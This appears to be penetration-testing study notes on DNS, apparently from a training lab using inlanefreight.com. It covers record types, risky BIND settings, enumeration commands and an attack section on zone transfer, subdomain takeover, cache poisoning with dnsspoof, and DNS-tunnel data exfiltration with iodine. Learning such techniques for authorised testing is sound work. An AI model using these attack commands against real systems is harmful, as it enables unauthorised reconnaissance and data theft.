#DNS #DomainNameServices #networkmanagement

## What is DNS?
Domain Name System — phonebook of the internet. Resolves human-readable domain names to IP addresses. Hierarchical, distributed, and critical infrastructure. Misconfigured DNS can expose internal network topology.

- Port **TCP/UDP 53** — DNS queries (TCP for zone transfers, UDP for standard queries)
- 13 root servers managed by ICANN
- Recursive resolution: resolver → root → TLD → authoritative

---

## Server Types

| Server Type | Description |
|---|---|
| `DNS Root Server` | Top of the DNS hierarchy; 13 globally. Last resort if NS doesn't respond. Managed by ICANN. |
| `Authoritative Nameserver` | Holds authority for a zone; returns binding answers for its zone only |
| `Non-authoritative Nameserver` | Collects DNS info via recursive/iterative queries; not responsible for a zone |
| `Caching DNS Server` | Caches responses from other servers for TTL duration |
| `Forwarding Server` | Forwards all queries to another DNS server |
| `Resolver` | Local resolver on a computer/router; performs name resolution locally |

---

## DNS Record Types

| Record | Description |
|---|---|
| `A` | IPv4 address for a hostname |
| `AAAA` | IPv6 address for a hostname |
| `CNAME` | Canonical name / alias → points to another hostname |
| `MX` | Mail exchange server for the domain (with priority) |
| `NS` | Authoritative nameservers for a domain |
| `PTR` | Reverse lookup: IP → hostname |
| `TXT` | Arbitrary text; used for SPF, DKIM, DMARC, domain verification |
| `SOA` | Start of Authority: primary NS, admin email, serial, refresh, retry, expire, minimum TTL |
| `SRV` | Service location records (host, port, priority, weight) |
| `CAA` | Certificate Authority Authorization — who can issue SSL certs |

---

## Configuration Files (BIND/named)

| File | Path |
|---|---|
| Main config | `/etc/bind/named.conf` |
| Local zones config | `/etc/bind/named.conf.local` |
| Options config | `/etc/bind/named.conf.options` |
| Zone files | `/etc/bind/db.<domain>` or `/var/cache/bind/` |

### Dangerous Settings

| Setting | Risk |
|---|---|
| `allow-transfer { any; }` | Zone transfer to any host |
| `allow-recursion { any; }` | Open recursive resolver (DDoS amplification) |
| `allow-query { any; }` | Query allowed from any IP |
| DNSSEC not configured | DNS spoofing / cache poisoning |
| Zone files world-readable | Internal network topology disclosed |

---

## Enumeration

### dig

```bash
# Basic A record lookup
dig A <domain>
dig A inlanefreight.com

# Specify DNS server
dig @<nameserver> <domain>
dig @10.129.14.128 inlanefreight.com

# All records
dig ANY @<nameserver> <domain>

# MX records
dig MX <domain>

# NS records
dig NS <domain>

# TXT records
dig TXT <domain>

# SOA record
dig SOA <domain>

# Reverse lookup (PTR)
dig -x <IP>
dig -x 10.129.14.128

# Zone transfer
dig axfr @<nameserver> <domain>
dig axfr @10.129.14.128 inlanefreight.com
```

### nslookup

```bash
# Forward lookup
nslookup <domain>
nslookup <domain> <nameserver>

# Reverse lookup
nslookup <IP>

# Query specific record type
nslookup -type=MX <domain>
nslookup -type=NS <domain>
nslookup -type=TXT <domain>
nslookup -type=SOA <domain>
nslookup -type=ANY <domain>

# Interactive mode
nslookup
> server 10.129.14.128
> set type=A
> inlanefreight.com
```

### Subdomain Enumeration

```bash
# gobuster DNS
gobuster dns -d <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d inlanefreight.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -r <nameserver>

# dnsenum
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 <domain>
dnsenum --enum inlanefreight.com -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# fierce
fierce --domain <domain>
fierce --domain <domain> --dns-servers <nameserver>

# amass
amass enum -d <domain>
amass enum -passive -d <domain>

# Nmap
nmap -p 53 --script dns-brute <domain>
nmap -sU -p 53 --script dns-recursion <target>

# dnsrecon
dnsrecon -d <domain> -t std                    # standard enum (A, NS, MX, SOA, TXT)
dnsrecon -d <domain> -t axfr                   # zone transfer attempt
dnsrecon -d <domain> -t brt -D wordlist.txt    # subdomain brute force
dnsrecon -d <domain> -t std,brt -D /usr/share/wordlists/dnsrecon/namelist.txt
```

---

## Attack Vectors

### Zone Transfer (AXFR)

```bash
# If allowed, reveals ALL internal DNS records
dig axfr @<nameserver> <domain>
host -l <domain> <nameserver>

# dnsenum automated
dnsenum --dnsserver <nameserver> <domain>

# Fierce
fierce --domain <domain>
```

### DNS Zone Walking (NSEC/NSEC3 — DNSSEC)

```bash
ldns-walk @<nameserver> <domain>
```

### Subdomain Takeover

```bash
# 1. Find subdomains pointing to defunct services (CNAME to inactive cloud resources)
# 2. Register the defunct resource to take over the subdomain
# Tool: subjack, nuclei -t takeovers/
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c /path/to/fingerprints.json
```

### DNS Cache Poisoning

```bash
# Requires interception or race condition — not easily automated
# dnsspoof (requires ARP poisoning first)
dnsspoof -i eth0 -f hosts.txt
```

### DNS Tunneling (Data Exfil)

```bash
# iodine (client/server for tunneling TCP over DNS)
# Server side (attacker)
iodined -f 10.0.0.1 tunnel.domain.com

# Client side (victim, after code exec)
iodine -f 10.129.14.128 tunnel.domain.com
```

---

## Quick Reference

| Goal | Command |
|---|---|
| Lookup A record | `dig A domain @nameserver` |
| Zone transfer | `dig axfr @nameserver domain` |
| All records | `dig ANY @nameserver domain` |
| Reverse lookup | `dig -x IP` |
| Subdomain brute | `gobuster dns -d domain -w wordlist.txt` |
| Subdomain enum | `dnsenum --enum domain -f wordlist.txt` |
| Check open recursion | `nmap -sU -p 53 --script dns-recursion host` |
